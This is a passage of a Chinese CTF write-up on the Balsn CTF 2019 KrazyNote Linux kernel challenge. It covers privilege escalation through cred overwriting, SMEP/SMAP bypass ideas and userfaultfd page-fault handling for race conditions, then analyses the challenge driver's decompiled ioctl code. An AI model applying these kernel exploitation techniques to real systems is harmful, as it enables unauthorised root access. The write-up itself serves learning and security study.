@@ -1,0 +1,761 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>本文所有测试文件地址见：<a href="https://github.com/bsauce/CTF/tree/master/KrazyNote-Balsn CTF 2019" target="_blank">https://github.com/bsauce/CTF/tree/master/KrazyNote-Balsn%20CTF%202019</a></p>
+<p><code>userfaltfd</code>在内核漏洞利用中非常有用，借这道题来学习一下。</p>
+<h2 data-content="1" id="febc92e8fc8a94d9854c93c25b8309fe">一、背景知识</h2>
+<h4 data-content="1" id="3a04216d943656ab56ee5f6ede23575b">1.提权</h4>
+<p>内核提权一般需要利用漏洞来修改<code>task_struct</code>中的cred结构，<code>commit_cred(prepare_kernel_creds(0))</code>会帮你找到cred结构并修改。</p>
+<p>SMEP防止在内核态执行用户态代码，采用ROP来绕过；SMAP防止内核态使用用户态数据，切断了用户态的ROP，可以<code>copy_from_user</code>和<code>copy_to_user</code>来绕过SMAP。</p>
+<h4 data-content="1" id="49593a8e4257890b804e271836f15ff8">2.页和虚内存</h4>
+<p>内核的内存主要有两个区域，RAM和交换区，即将被使用的内存保存在RAM中，暂时不被使用的内存放在交换区，内核控制交换进出过程。RAM中地址是物理地址，而内核使用虚地址，所以通过页表建立虚地址到物理地址的映射。虚拟页和物理页大小都是0x1000字节，64位系统下需2^52^个页，还是很大，可采用多级页表</p>
+<h4 data-content="1" id="2ff7a75972d5e840cba8046fc0010b7f">3.页调度与延迟加载</h4>
+<p>有的内存既不在RAM也不在交换区，例如mmap创建的内存映射页。mmap页在<code>read/write</code>访问之前，实际上还没有创建（还没有映射到实际的物理页），例如：<code>mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0);</code></p>
+<p>内核并未将<code>fd</code>内容拷贝到<code>0x1337000</code>，只是将地址0x1337000映射到文件<code>fd</code>。</p>
+<p>当有如下代码访问时：</p>
+<div class="highlight"><pre><span></span><span class="kt">char</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x1337000</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"content: %c</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</pre></div>
+<p>若发生对该页的引用，则（1）为0x1337000创建物理帧，（2）从fd读内容到0x1337000，（3）并在页表标记合适的入口，以便识别0x1337000虚地址。如果是堆空间映射，仅第2步不同，只需将对应物理帧清0。</p>
+<p>总之，若首次访问mmap创建的页，会耗时很长，会导致上下文切换和当前线程的睡眠。</p>
+<h4 data-content="1" id="6f6121268767313b8ec8f15c978fb79d">4.别名页 Alias pages</h4>
+<p>没有ABI能直接访问物理页，但内核有时需要修改物理帧的值（例如修改页表入口），于是引入了别名页，将物理帧映射到虚拟页。在每个线程的启动和退出的页表中，所以大多数物理帧有两个虚拟页映射到它，这就是“别名”的由来。通常别名页的地址是<code>SOME_OFFSET + physical address</code>。</p>
+<h4 data-content="1" id="37a298501023dfbbf325e53c8bda9123">5.userfaultfd</h4>
+<p><code>userfaultfd</code>机制可以让用户来处理缺页，可以在用户空间定义自己的<code>page fau handler</code>。用法请参考<a href="http://man7.org/linux/man-pages/man2/userfaultfd.2.html" target="_blank">官方文档</a>，含示例代码，见文件<code>userfaultfd_demo.c</code>。</p>
+<p><strong>Step 1: 创建一个描述符uffd</strong></p>
+<p>所有的注册内存区间、配置和最终的缺页处理等就都需要用ioctl来对这个uffd操作。ioctl-userfaultfd支持<code>UFFDIO_API</code>、<code>UFFDIO_REGISTER</code>、<code>UFFDIO_UNREGISTER</code>、<code>UFFDIO_COPY</code>、<code>UFFDIO_ZEROPAGE</code>、<code>UFFDIO_WAKE</code>等选项。比如<code>UFFDIO_REGISTER</code>用来向<code>userfaultfd</code>机制注册一个监视区域，这个区域发生缺页时，需要用<code>UFFDIO_COPY</code>来向缺页的地址拷贝自定义数据。</p>
+<div class="highlight"><pre><span></span><span class="c"># 2 个用于注册、注销的ioctl选项：</span>
+<span class="nf">UFFDIO_REGISTER</span>                 <span class="err">注册将触发</span><span class="no">user-fault的内存地址</span>
+<span class="nf">UFFDIO_UNREGISTER</span>               <span class="err">注销将触发</span><span class="no">user-fault的内存地址</span>
+<span class="c"># 3 个用于处理user-fault事件的ioctl选项：</span>
+<span class="nf">UFFDIO_COPY</span>                     <span class="err">用已知数据填充</span><span class="no">user-fault页</span>
+<span class="nf">UFFDIO_ZEROPAGE</span>                 <span class="err">将</span><span class="no">user-fault页填零</span>
+<span class="nf">UFFDIO_WAKE</span>                     <span class="err">用于配合上面两项中</span> <span class="no">UFFDIO_COPY_MODE_DONTWAKE</span> <span class="err">和</span>
+                                <span class="nf">UFFDIO_ZEROPAGE_MODE_DONTWAKE模式实现批量填充</span>  
+<span class="c"># 1 个用于配置uffd特殊用途的ioctl选项：</span>
+<span class="no">UFFDIO_API</span>                      <span class="err">它又包括如下</span><span class="no">feature可以配置</span><span class="err">：</span>
+                                <span class="nf">UFFD_FEATURE_EVENT_FORK</span>         <span class="p">(</span><span class="no">since</span> <span class="no">Linux</span> <span class="mi">4</span><span class="no">.11</span><span class="p">)</span>
+                                <span class="nf">UFFD_FEATURE_EVENT_REMAP</span>        <span class="p">(</span><span class="no">since</span> <span class="no">Linux</span> <span class="mi">4</span><span class="no">.11</span><span class="p">)</span>
+                                <span class="nf">UFFD_FEATURE_EVENT_REMOVE</span>       <span class="p">(</span><span class="no">since</span> <span class="no">Linux</span> <span class="mi">4</span><span class="no">.11</span><span class="p">)</span>
+                                <span class="nf">UFFD_FEATURE_EVENT_UNMAP</span>        <span class="p">(</span><span class="no">since</span> <span class="no">Linux</span> <span class="mi">4</span><span class="no">.11</span><span class="p">)</span>
+                                <span class="nf">UFFD_FEATURE_MISSING_HUGETLBFS</span>  <span class="p">(</span><span class="no">since</span> <span class="no">Linux</span> <span class="mi">4</span><span class="no">.11</span><span class="p">)</span>
+                                <span class="nf">UFFD_FEATURE_MISSING_SHMEM</span>      <span class="p">(</span><span class="no">since</span> <span class="no">Linux</span> <span class="mi">4</span><span class="no">.11</span><span class="p">)</span>
+                                <span class="nf">UFFD_FEATURE_SIGBUS</span>             <span class="p">(</span><span class="no">since</span> <span class="no">Linux</span> <span class="mi">4</span><span class="no">.14</span><span class="p">)</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="c1">// userfaultfd系统调用创建并返回一个uffd，类似一个文件的fd</span>
+<span class="n">uffd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_userfaultfd</span><span class="p">,</span> <span class="n">O_CLOEXEC</span> <span class="o">|</span> <span class="n">O_NONBLOCK</span><span class="p">);</span>
+</pre></div>
+<p><strong>STEP 2. 用ioctl的UFFDIO_REGISTER选项注册监视区域</strong></p>
+<div class="highlight"><pre><span></span><span class="c1">// 注册时要用一个struct uffdio_register结构传递注册信息:</span>
+<span class="c1">// struct uffdio_range {</span>
+<span class="c1">// __u64 start;    /* Start of range */</span>
+<span class="c1">// __u64 len;      /* Length of range (bytes) */</span>
+<span class="c1">// };</span>
+<span class="c1">//</span>
+<span class="c1">// struct uffdio_register {</span>
+<span class="c1">// struct uffdio_range range;</span>
+<span class="c1">// __u64 mode;     /* Desired mode of operation (input) */</span>
+<span class="c1">// __u64 ioctls;   /* Available ioctl() operations (output) */</span>
+<span class="c1">// };</span>
+
+<span class="n">addr</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">page_size</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="c1">// addr 和 len 分别是我匿名映射返回的地址和长度，赋值到uffdio_register</span>
+<span class="n">uffdio_register</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">start</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">addr</span><span class="p">;</span>
+<span class="n">uffdio_register</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
+<span class="c1">// mode 只支持 UFFDIO_REGISTER_MODE_MISSING</span>
+<span class="n">uffdio_register</span><span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="n">UFFDIO_REGISTER_MODE_MISSING</span><span class="p">;</span>
+<span class="c1">// 用ioctl的UFFDIO_REGISTER注册</span>
+<span class="n">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_REGISTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uffdio_register</span><span class="p">);</span>
+</pre></div>
+<p><strong>STEP 3. 创建一个处理专用的线程轮询和处理”user-fault”事件</strong></p>
+<p>要使用userfaultfd，需要创建一个处理专用的线程轮询和处理”user-fault”事件。主进程中就要调用<code>pthread_create</code>创建这个自定义的handler线程：</p>
+<div class="highlight"><pre><span></span><span class="c1">// 主进程中调用pthread_create创建一个fault handler线程</span>
+<span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">thr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">fault_handler_thread</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">uffd</span><span class="p">);</span>
+</pre></div>
+<p>一个自定义的线程函数举例如下，这里处理的是一个普通的匿名页用户态缺页，我们要做的是把我们一个已有的一个page大小的buffer内容拷贝到缺页的内存地址处。用到了<code>poll</code>函数轮询<code>uffd</code>，并对轮询到的<code>UFFD_EVENT_PAGEFAULT</code>事件(event)用拷贝(ioctl的<code>UFFDIO_COPY</code>选项)进行处理。</p>
+<p><strong>注意</strong>：如果写exp只需处理一次缺页，可以不用循环。</p>
+<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span> <span class="nf">fault_handler_thread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>    
+    <span class="c1">// 轮询uffd读到的信息需要存在一个struct uffd_msg对象中</span>
+    <span class="k">static</span> <span class="k">struct</span> <span class="n">uffd_msg</span> <span class="n">msg</span><span class="p">;</span>
+    <span class="c1">// ioctl的UFFDIO_COPY选项需要我们构造一个struct uffdio_copy对象</span>
+    <span class="k">struct</span> <span class="n">uffdio_copy</span> <span class="n">uffdio_copy</span><span class="p">;</span>
+    <span class="n">uffd</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="n">arg</span><span class="p">;</span>
+      <span class="p">......</span>
+    <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span> <span class="c1">// 此线程不断进行polling，所以是死循环</span>
+        <span class="c1">// poll需要我们构造一个struct pollfd对象</span>
+        <span class="k">struct</span> <span class="n">pollfd</span> <span class="n">pollfd</span><span class="p">;</span>
+        <span class="n">pollfd</span><span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="n">uffd</span><span class="p">;</span>
+        <span class="n">pollfd</span><span class="p">.</span><span class="n">events</span> <span class="o">=</span> <span class="n">POLLIN</span><span class="p">;</span>
+        <span class="n">poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pollfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="c1">// 读出user-fault相关信息</span>
+        <span class="n">read</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">));</span>
+        <span class="c1">// 对于我们所注册的一般user-fault功能，都应是UFFD_EVENT_PAGEFAULT这个事件</span>
+        <span class="n">assert</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">event</span> <span class="o">==</span> <span class="n">UFFD_EVENT_PAGEFAULT</span><span class="p">);</span>
+        <span class="c1">// 构造uffdio_copy进而调用ioctl-UFFDIO_COPY处理这个user-fault</span>
+        <span class="n">uffdio_copy</span><span class="p">.</span><span class="n">src</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">page</span><span class="p">;</span>
+        <span class="n">uffdio_copy</span><span class="p">.</span><span class="n">dst</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">msg</span><span class="p">.</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="n">page_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="n">uffdio_copy</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">page_size</span><span class="p">;</span>
+        <span class="n">uffdio_copy</span><span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">uffdio_copy</span><span class="p">.</span><span class="n">copy</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="c1">// page(我们已有的一个页大小的数据)中page_size大小的内容将被拷贝到新分配的msg.arg.pagefault.address内存页中</span>
+        <span class="n">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_COPY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uffdio_copy</span><span class="p">);</span>
+          <span class="p">......</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<h2 data-content="1" id="6f30d7657ad763adcb829831ba5e4ef9">二、漏洞分析</h2>
+<h4 data-content="1" id="ccb3ca80d43f28efc27e9fbe2c0dce9e">1.init_module()函数</h4>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">init_module</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">bufPtr</span> <span class="o">=</span> <span class="n">bufStart</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">misc_register</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p><code>dev</code>是<code>struct miscdevice</code>结构</p>
+<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">miscdevice</span>  <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">minor</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
+    <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="o">*</span><span class="n">fops</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">list</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">device</span> <span class="o">*</span><span class="n">parent</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">device</span> <span class="o">*</span><span class="n">this_device</span><span class="p">;</span>
+    <span class="k">const</span> <span class="k">struct</span> <span class="n">attribute_group</span> <span class="o">**</span><span class="n">groups</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">nodename</span><span class="p">;</span>
+    <span class="n">umode_t</span> <span class="n">mode</span><span class="p">;</span>
+<span class="p">};</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="c">#在IDA中看dev结构，dev_name是"note"，fops指向0x680处。</span>
+<span class="nl">.data:</span><span class="err">0000000000000620</span> <span class="nf">dev</span>             <span class="no">db</span>  <span class="mi">0</span><span class="no">Bh</span>                 <span class="c">; DATA XREF: init_module+5↑o</span>
+<span class="no">.data</span><span class="p">:</span><span class="mi">0000000000000620</span>                                         <span class="c">; cleanup_module+5↑o</span>
+<span class="no">.data</span><span class="p">:</span><span class="mi">0000000000000621</span>                 <span class="no">db</span>    <span class="mi">0</span>
+<span class="nl">.data:</span><span class="err">0000000000000622</span>                 <span class="nf">db</span>    <span class="mi">0</span>
+<span class="nl">.data:</span><span class="err">0000000000000623</span>                 <span class="nf">db</span>    <span class="mi">0</span>
+<span class="nl">.data:</span><span class="err">0000000000000624</span>                 <span class="nf">db</span>    <span class="mi">0</span>
+<span class="nl">.data:</span><span class="err">0000000000000625</span>                 <span class="nf">db</span>    <span class="mi">0</span>
+<span class="nl">.data:</span><span class="err">0000000000000626</span>                 <span class="nf">db</span>    <span class="mi">0</span>
+<span class="nl">.data:</span><span class="err">0000000000000627</span>                 <span class="nf">db</span>    <span class="mi">0</span>
+<span class="nl">.data:</span><span class="err">0000000000000628</span>                 <span class="nf">dq</span> <span class="no">offset</span> <span class="no">aNote</span>         <span class="c">; "note"</span>
+<span class="no">.data</span><span class="p">:</span><span class="mi">0000000000000630</span>                 <span class="no">dq</span> <span class="no">offset</span> <span class="no">unk_680</span>
+<span class="nl">.data:</span><span class="err">0000000000000638</span>                 <span class="nf">align</span> <span class="mi">80</span><span class="no">h</span>
+<span class="nl">.data:</span><span class="err">0000000000000680</span> <span class="nf">unk_680</span>         <span class="no">db</span>    <span class="mi">0</span>                 <span class="c">; DATA XREF: .data:0000000000000630↑o</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="c1">// file_operations结构</span>
+<span class="k">struct</span> <span class="n">file_operations</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">module</span> <span class="o">*</span><span class="n">owner</span><span class="p">;</span>
+    <span class="n">loff_t</span> <span class="p">(</span><span class="o">*</span><span class="n">llseek</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="n">loff_t</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
+    <span class="kt">ssize_t</span> <span class="p">(</span><span class="o">*</span><span class="n">read</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="kt">size_t</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="p">);</span>
+    <span class="kt">ssize_t</span> <span class="p">(</span><span class="o">*</span><span class="n">write</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="kt">size_t</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="p">);</span>
+    <span class="kt">ssize_t</span> <span class="p">(</span><span class="o">*</span><span class="n">read_iter</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">kiocb</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="p">);</span>
+    <span class="kt">ssize_t</span> <span class="p">(</span><span class="o">*</span><span class="n">write_iter</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">kiocb</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">iopoll</span><span class="p">)(</span><span class="k">struct</span> <span class="n">kiocb</span> <span class="o">*</span><span class="n">kiocb</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">spin</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">iterate</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dir_context</span> <span class="o">*</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">iterate_shared</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dir_context</span> <span class="o">*</span><span class="p">);</span>
+    <span class="n">__poll_t</span> <span class="p">(</span><span class="o">*</span><span class="n">poll</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">poll_table_struct</span> <span class="o">*</span><span class="p">);</span>
+    <span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">unlocked_ioctl</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">);</span>
+    <span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">compat_ioctl</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">);</span>
+
+    <span class="p">...</span> <span class="n">truncated</span>
+<span class="p">};</span>
+</pre></div>
+<p><code>unk_680</code>对应<code>file_operations</code>结构，发现只定义了<code>open</code>和<code>unlocked_ioctl</code>函数，其他都是null。<code>unlocked_ioctl</code>和<code>compat_ioctl</code>有区别，<code>unlocked_ioctl</code>不使用内核提供的全局同步锁，所有的同步原语需自己实现，所以可能存在条件竞争漏洞。</p>
+<h4 data-content="1" id="2168a5d3bd5d2e85aa31956192bf81ff">2.unlocked_ioctl()函数</h4>
+<p>unlocked_ioctl()函数实现4个功能：new/edit/show/delete。</p>
+<div class="highlight"><pre><span></span><span class="c1">// 从用户缓冲区userPtr拷贝参数到req结构, note length / note content</span>
+<span class="kt">void</span> <span class="o">*</span> <span class="nf">unlocked_ioctl</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">operation</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">userPtr</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">encBuffer</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+  <span class="k">struct</span> <span class="n">noteRequest</span> <span class="n">req</span><span class="p">;</span>
+
+  <span class="n">memset</span><span class="p">(</span><span class="n">encBuffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">encBuffer</span><span class="p">));</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="n">userPtr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">))</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">14</span><span class="p">;</span>
+  <span class="cm">/* make note, view note, edit note, delete note */</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="c1">// noteRequest结构——用户参数</span>
+<span class="k">struct</span> <span class="n">noteRequest</span><span class="p">{</span>
+  <span class="kt">size_t</span> <span class="n">idx</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">length</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">userptr</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">// note结构——存储的note</span>
+<span class="k">struct</span> <span class="n">note</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">key</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">length</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">contentPtr</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">content</span><span class="p">[];</span>
+<span class="p">}</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="c1">//(1) new note功能, operation == -256</span>
+<span class="cm">/* 创建note，从bufPtr分配空间，从current_task获取key(task_struct.mm-&gt;pgd,页全局目录的存放位置)，对content进行XOR加密。最后将(&amp;note-&gt;content - page_offset_base)值保存，别名页的地址是【SOME_OFFSET + physical address】，page_offset_base就是这个SOME_OFFSET。没开kaslr时，page_offset_base固定，否则随机化。</span>
+<span class="cm">注意：length长度范围是0~0x100，从汇编指令可看出来`movzx   ecx, byte ptr [rsp+140h+req.length]`，是byte级赋值操作。</span>
+<span class="cm">*/</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">operation</span> <span class="o">==</span> <span class="o">-</span><span class="mi">256</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">notes</span><span class="p">[</span><span class="n">idx</span><span class="p">])</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">++</span><span class="n">idx</span> <span class="o">==</span> <span class="mi">16</span><span class="p">)</span>
+            <span class="k">return</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
+        <span class="p">}</span> <span class="c1">// 从全局数组notes找到空位，最多16个note</span>
+
+    <span class="n">new</span> <span class="o">=</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="n">bufPtr</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">noteIndex</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
+    <span class="n">notes</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="n">bufPtr</span><span class="p">;</span>
+    <span class="n">new</span><span class="o">-&gt;</span><span class="n">length</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">noteLength</span><span class="p">;</span>
+    <span class="n">new</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">__readgsqword</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">current_task</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x7E8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">80</span><span class="p">);</span><span class="c1">// ????</span>
+    <span class="n">bufPtr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">new</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">[</span><span class="n">req</span><span class="p">.</span><span class="n">length</span><span class="p">];</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">req</span><span class="p">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mh">0x100uLL</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">_warn_printk</span><span class="p">(</span><span class="s">"Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">256LL</span><span class="p">,</span> <span class="n">req</span><span class="p">.</span><span class="n">length</span><span class="p">);</span>
+      <span class="n">BUG</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">encBuffer</span><span class="p">,</span> <span class="n">req</span><span class="p">.</span><span class="n">length</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+    <span class="n">copy_from_user</span><span class="p">(</span><span class="n">encBuffer</span><span class="p">,</span> <span class="n">userptr</span><span class="p">,</span> <span class="n">req</span><span class="p">.</span><span class="n">length</span><span class="p">);</span>
+    <span class="n">length</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">req</span><span class="p">.</span><span class="n">length</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">i</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+      <span class="k">do</span>
+      <span class="p">{</span>
+        <span class="n">encBuffer</span><span class="p">[</span><span class="n">i</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">^=</span> <span class="n">new</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">;</span>         <span class="c1">// encryption</span>
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">8LL</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">while</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span> <span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">new</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span> <span class="n">encBuffer</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+    <span class="n">new</span><span class="o">-&gt;</span><span class="n">contentPtr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">new</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">[</span><span class="o">-</span><span class="n">page_offset_base</span><span class="p">];</span><span class="c1">// 注意 page_offset_base</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</pre></div>
